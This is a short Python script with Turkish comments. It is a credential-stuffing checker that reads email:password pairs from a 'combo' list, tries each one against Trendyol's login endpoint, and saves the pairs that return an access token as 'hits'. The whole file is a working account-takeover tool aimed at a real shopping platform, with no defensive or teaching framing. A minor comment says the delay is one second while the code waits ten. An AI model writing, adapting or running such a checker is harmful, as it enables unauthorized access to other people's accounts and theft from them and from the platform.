import requests
import time  # time modülünü ekledik

combo_file = input(" ~ Combo : ")

# Trendyol login endpoint URL'si
login_url = "https://auth.trendyol.com/login"  # Trendyol'un API URL'si

with open(combo_file) as file, open("trendyol.txt", "a") as hit:
    for line in file:
        email, sifre = line.strip().split(":")

        # Kullanıcı bilgileri
        payload = {
            "email": email,
            "password": sifre
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "application-id": "1",  # Trendyol tarafından kullanılan zorunlu parametre
            "storefront-id": "1"
        }
        try:
            # POST isteği gönder
            response = requests.post(login_url, json=payload, headers=headers)

            if response.status_code == 200:
                # Yanıtı kontrol et (giriş başarılıysa)
                response_data = response.json()
                if "access_token" in response_data:
                    hit.write(f"{email}:{sifre}\n")
                    print(f"Başarılı ✅: {email}:{sifre}")
                else:
                    print(f"Başarısız❌: {email}:{sifre}")
            else:
                print(f"Giriş Başarısız: {email}:{sifre} - {response.status_code}")

            # Her isteğin arasında 1 saniye bekle
            time.sleep(10)  # 1 saniye bekle

        except requests.RequestException as e:
            print(f"Bağlantı hatası: {e}")
